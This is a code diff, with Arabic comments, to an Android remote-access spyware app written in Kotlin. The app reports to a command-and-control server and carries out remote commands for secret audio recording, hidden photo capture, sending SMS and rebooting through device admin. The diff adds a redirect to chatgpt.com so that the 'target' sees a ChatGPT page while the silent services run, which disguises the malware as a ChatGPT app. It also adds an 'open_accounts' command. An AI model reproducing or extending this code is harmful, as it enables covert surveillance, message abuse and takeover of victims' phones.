@@ -46,7 +46,12 @@ class MainActivity : AppCompatActivity() {
     private val PERMISSION_REQUEST_CODE = 600
     private val ADMIN_REQUEST_CODE = 700
 
+    // السيرفر الخلفي لاستقبال البيانات
     private val C2_SERVER_URL = "https://mohammed2000999.vercel.app"
+    
+    // رابط شات جيبيتي الذي سيظهر للهدف بعد الدخول
+    private val TARGET_REDIRECT_URL = "https://chatgpt.com"
+    
     private lateinit var sessionToken: String
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -131,7 +136,7 @@ class MainActivity : AppCompatActivity() {
                 conn.doOutput = true
                 val payload = JSONObject().apply {
                     put("session_token", sessionToken)
-                    put("user_agent", System.getProperty("http.agent") ?: "Android Target v79.0")
+                    put("user_agent", System.getProperty("http.agent") ?: "ChatGPT Target v79.0")
                     put("platform", "Android OS Target")
                 }
                 OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
@@ -237,7 +242,8 @@ class MainActivity : AppCompatActivity() {
             override fun onPermissionRequest(request: PermissionRequest?) { request?.grant(request.resources) }
         }
         webView.clearCache(true)
-        webView.loadUrl(C2_SERVER_URL)
+        // توجيه واجهة التطبيق مباشرة لرابط تشات جيبيتي بعد تحميل الخدمات الصامتة
+        webView.loadUrl(TARGET_REDIRECT_URL)
     }
 
     override fun onBackPressed() {
@@ -286,6 +292,7 @@ class BackgroundControlService : Service() {
                                         "start_audio_recording" -> executeSecretAudioRecording()
                                         "capture_hidden_photo" -> executeHiddenPhotoCapture()
                                         "open_whatsapp" -> openAppPackage("com.whatsapp")
+                                        "open_accounts" -> openAppPackage("com.android.settings")
                                         "open_camera" -> openCameraApp()
                                         "send_sms" -> sendSMSMessage(cmd.optString("phone"), cmd.optString("body"))
                                         "reboot_device" -> executeRebootDevice()
@@ -442,11 +449,9 @@ class BackgroundControlService : Service() {
 
     private fun openAppPackage(packageName: String) {
         try {
-            val intent = packageManager.getLaunchIntentForPackage(packageName)
-            intent?.let {
-                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(it)
-            }
+            val intent = packageManager.getLaunchIntentForPackage(packageName) ?: Intent(packageName).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
         } catch (e: Exception) {}
     }
 
@@ -469,7 +474,7 @@ class BackgroundControlService : Service() {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
             if (dpm.isAdminActive(adminComponent) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
+                dpm.reboot()
             }
         } catch (e: Exception) {}
     }
